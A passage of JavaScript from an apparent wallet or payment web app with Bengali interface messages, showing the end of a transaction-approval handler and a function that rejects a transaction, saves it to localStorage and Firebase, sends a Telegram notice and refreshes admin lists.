        showCustomAlert("সফল", 'ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে!');

        if (activeUser && activeUser.email === targetUser.email) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }

        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
    }
}

async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`❌ <b>ট্রানজেকশন রিজেক্টেড!</b>\n\n👤 ইউজার: ${allTransactions[txIndex].userName}`);

        showCustomAlert("সফল", 'রিকোয়েস্টটি রিজেক্ট করা হয়েছে।');
        
        renderAdminPendingList();
        renderAdminAllHistory();
    }
}